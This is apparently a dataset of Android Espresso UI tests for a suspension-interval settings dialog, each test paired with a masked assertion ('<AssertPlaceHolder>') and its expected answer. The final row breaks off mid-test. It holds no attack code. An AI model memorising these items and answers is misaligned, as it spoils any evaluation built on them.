"testIntervalsDefaultValuesOpenAdjustStartOverlapDaysValid() { Interval interval1 = getInterval1(); Time start = new Time(); start.setHour(22); start.setMinute(0); Time end = new Time(); end.setHour(6); end.setMinute(0); interval1.setStart(start); interval1.setEnd(end); getIntervalDAO().insertInterval(interval1); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(1))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 22:00 End: 06:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(22))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(12)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(0)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(6))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 12:00 End: 06:00""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(1, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesOpenAdjustStartOverlapDaysValidScreenRotation() { Interval interval1 = getInterval1(); Time start = new Time(); start.setHour(22); start.setMinute(0); Time end = new Time(); end.setHour(6); end.setMinute(0); interval1.setStart(start); interval1.setEnd(end); getIntervalDAO().insertInterval(interval1); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(1))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 22:00 End: 06:00""))); rotateScreen(activityScenario); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(22))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(12)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(0)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(6))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); rotateScreen(activityScenario); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 12:00 End: 06:00""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(1, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesOpenAdjustStartDurationInvalid() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(11)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(0)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(13))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 11:00 End: 13:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesOpenAdjustStartDurationInvalidScreenRotation() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(11)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(0)); rotateScreen(activityScenario); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); rotateScreen(activityScenario); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(13))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 11:00 End: 13:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesOpenAdjustStartOverlapInvalid() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(12)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(0)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(14))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 12:00 End: 14:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesOpenAdjustStartOverlapInvalidScreenRotation() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).perform(click()); rotateScreen(activityScenario); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(12)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(0)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); rotateScreen(activityScenario); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(14))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 12:00 End: 14:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesOpenLargeGapAdjustStart() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(12)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(0)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(14))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 12:00 End: 14:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesOpenLargeGapAdjustStartScreenRotation() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(11))); rotateScreen(activityScenario); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(12)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(0)); rotateScreen(activityScenario); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(14))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); 